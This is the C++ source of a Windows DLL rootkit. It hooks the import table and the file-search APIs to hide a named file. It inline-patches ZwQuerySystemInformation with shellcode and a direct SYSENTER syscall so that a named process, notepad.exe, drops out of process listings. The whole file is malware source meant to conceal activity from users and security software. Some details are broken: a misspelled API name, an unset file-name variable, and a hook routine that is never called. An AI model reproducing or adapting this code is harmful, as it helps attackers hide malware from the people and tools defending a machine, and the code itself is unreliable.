//Be sure to rename this file to dllmain  during compilation: Defines the entry point of our DLL application

#include <string>
#include <windows.h>

using namespace std;

string F_HIDE;
string F_STR;
char F_TMP[260];

NTSTATUS (WINAPI* ZwQuerySystemInformation) (int SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

typedef LONG KPRIORITY;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaxmimumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _VM_COUNTERS {
    ULONG PeakVirtualSize;
    ULONG VirtualSize;
    ULONG PageFaultCount;
    ULONG PeakWorkingSetSize;
    ULONG WorkingSetSize;
    ULONG QuotaPeakPagedPoolUsage;
    ULONG QuotaPagedPoolUsage;
    ULONG PagefileUsage;
    ULONG PeakPagefileUsage;
} VM_COUNTERS;

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER Reserved[3];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE ProcessId;
    HANDLE InheritedFromProcessId;
    ULONG HandleCount;
    ULONG Reserved2[2];
    ULONG PrivatePageCount;
    VM_COUNTERS VirtualMemoryCounters;
    IO_COUNTERS IoCounters;
    void* Threads;
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

BOOL(WINAPI* MyFindNextFileA)(HANDLE h, LPWIN32_FIND_DATA data);
HANDLE(WINAPI* MyFindFirstFileExA)(LPCSTR lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags);

HANDLE WINAPI NewFindFirstFileExA(LPCSTR lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags)
{
    HANDLE h = MyFindFirstFileExA(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
    if (h != 0)
    {
        WIN32_FIND_DATA* fd = (WIN32_FIND_DATA*)lpFindFileData;
        strcpy(F_TMP, fd->cFileName);
        F_STR = F_TMP;
        if (F_STR == F_HIDE)
        {
            if (!MyFindNextFileA(h, fd))
            {
                return 0;
            }
        }
    }
    return h;
}

bool NewFindNextFileA(HANDLE h, WIN32_FIND_DATA* lpFindFileData)
{
    bool ret = MyFindNextFileA(h, lpFindFileData);
    if (ret)
    {
        strcpy(F_TMP, lpFindFileData->cFileName);
        F_STR = F_TMP;
        if (F_STR == F_HIDE)
        {
            if (!NewFindNextFileA(h, lpFindFileData))
            {
                ret = false;
            }
        }
    }
    return ret;
}

void IAT(HINSTANCE hInstance, string lib_name, string f_name, FARPROC func)
{
    PIMAGE_DOS_HEADER pdosheader = (PIMAGE_DOS_HEADER)hInstance; //DOS Header
    PIMAGE_NT_HEADERS pntheaders = (PIMAGE_NT_HEADERS)((DWORD)hInstance + pdosheader->e_lfanew); //NT Header
    PIMAGE_IMPORT_DESCRIPTOR pimportdescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hInstance + pntheaders->OptionalHeader.DataDirectory[1].VirtualAddress); //IAT
    PIMAGE_THUNK_DATA pthunkdatain, pthunkdataout;
    PIMAGE_IMPORT_BY_NAME pimportbyname;

    PCHAR ptr;

    int i = 0;
    while (pimportdescriptor->TimeDateStamp != 0 || pimportdescriptor->Name != 0)
    {
        ptr = (PCHAR)((DWORD)hInstance + (DWORD)pimportdescriptor->Name); // Library Name
        i = 0;

        pthunkdataout = (PIMAGE_THUNK_DATA)((DWORD)hInstance + (DWORD)pimportdescriptor->FirstThunk);
        if (pimportdescriptor->Characteristics == 0)
        {
            pthunkdatain = pthunkdataout;
        }
        else
        {
            pthunkdatain = (PIMAGE_THUNK_DATA)((DWORD)pimportdescriptor->Characteristics);
        }
        while (pthunkdatain->u1.AddressOfData != NULL)
        {
            if ((DWORD)pthunkdatain->u1.Ordinal & IMAGE_ORDINAL_FLAG)
            {
                // Search by ordinal is not used here
            }
            else {
                pimportbyname = (PIMAGE_IMPORT_BY_NAME)((DWORD)pthunkdatain->u1.AddressOfData + (DWORD)hInstance);
                if (f_name == (char*)pimportbyname->Name && GetModuleHandle(lib_name.c_str()) == GetModuleHandle(ptr))
                {
                    DWORD old;
                    char* buf = (char*)hInstance;
                    VirtualProtect((char*)(buf + pimportdescriptor->FirstThunk + (i * 4)), 4, PAGE_EXECUTE_READWRITE, &old);
                    memcpy((char*)(buf + pimportdescriptor->FirstThunk + (i * 4)), &func, 4); // Hook
                }
            }
            i++;
            pthunkdatain++;
            pthunkdataout++;
        }
        pimportdescriptor++;
    }
}



__declspec(noinline) char* WINAPI Unicode2ANSI(char* buf, int len)
{
    len = len / 2;
    char* ret = (char*)malloc(len + 1);
    memset(ret, 0, len + 1);
    if (len == 0)
    {
        return ret;
    }
    int i = 0;
    while (i < len)
    {
        ret[i] = buf[2 * i];
        i++;
    }
    ret[len] = 0;
    return ret;
}

string p_name;
NTSTATUS stat;
string str;
DWORD SIC;
char* tmp_buf;
SYSTEM_PROCESS_INFORMATION* SPI;
SYSTEM_PROCESS_INFORMATION* p_SPI = 0;

int ZwQuerySystemInformation_syscall; // Syscall number

void __declspec(naked)sys(void)
{
    __asm {
        mov edx,esp
            __emit 0x0f //0x0f34 = SYSENTER
            __emit 0x34
            RET
    }
}

void __declspec(naked)Sys_ZwQSI(void) //ZwQuerySystemInformation
{
    __asm {
        mov eax,ZwQuerySystemInformation_syscall
        call sys
        ret
    }
}

void __declspec(naked)NewZWQuerySyscallInformation(int SystemInformationClass, PVOID out_buf, ULONG SystemInformationLength, PULONG ReturnLength)
{
    __asm {
        PUSHAD
        PUSH DWORD PTR SS:[ESP+52]
        PUSH DWORD PTR SS:[ESP+52]
        PUSH DWORD PTR SS:[ESP+52]
        PUSH DWORD PTR SS:[ESP+52]
    }

    Sys_ZwQSI();

    __asm {
        mov stat,eax
        pop eax
        pop eax
        pop eax
        pop eax
        mov eax,[ESP+0x28]
        mov SIC,eax
    }

    if (stat == 0 && SIC == 5)
    {
        __asm {
            mov eax,[ESP+44]
            mov SPI, eax
        }
    }

    p_SPI = 0;
    while (SPI != p_SPI)
    {
        tmp_buf = Unicode2ANSI((CHAR*)SPI->ImageName.Buffer, SPI->ImageName.Length);
        str = tmp_buf;
        free(tmp_buf);
        if (str == p_name)
        {
            if (SPI->NextEntryOffset == 0)
            {
                SPI->NextEntryOffset = 0;
            }
            else
            {
                p_SPI->NextEntryOffset += SPI->NextEntryOffset;
            }
        }
        p_SPI = SPI;
        char* t = (char*)SPI;
        t += SPI->NextEntryOffset;
        SPI = (SYSTEM_PROCESS_INFORMATION*)t;

    }
    __asm POPAD
    __asm mov eax, stat
    __asm ret
}


void HideProcess(char* name)
{
    ZwQuerySystemInformation = (NTSTATUS(__stdcall*) (int, PVOID, ULONG, PULONG))GetProcAddress(GetModuleHandle
    ("ntdll.dll"), "NtQwerySystemInformation");
    memcpy(&ZwQuerySystemInformation_syscall, (char*)((char*)ZwQuerySystemInformation + 1), 4);
    p_name = name;
    DWORD old;
    VirtualProtect(ZwQuerySystemInformation, 10, PAGE_EXECUTE_READWRITE, &old);
    char shellcode[] = "\xB8\x00\x00\x00\x00\xFF\xD0\xC2\x10\x00";
    /*
        MOV EAX,0
        CALL EAX
        RET 10
    */

    int x = (int)NewZWQuerySyscallInformation;
    memcpy((char*)((char*)shellcode + 1), &x, 4);
    memcpy((char*)ZwQuerySystemInformation, shellcode, 10);
    VirtualProtect(ZwQuerySystemInformation, 7, old, &old);
    ZwQuerySystemInformation = (NTSTATUS(__stdcall*)(int, PVOID, ULONG, PULONG))Sys_ZwQSI;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        HideProcess((char *)"notepad.exe");
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}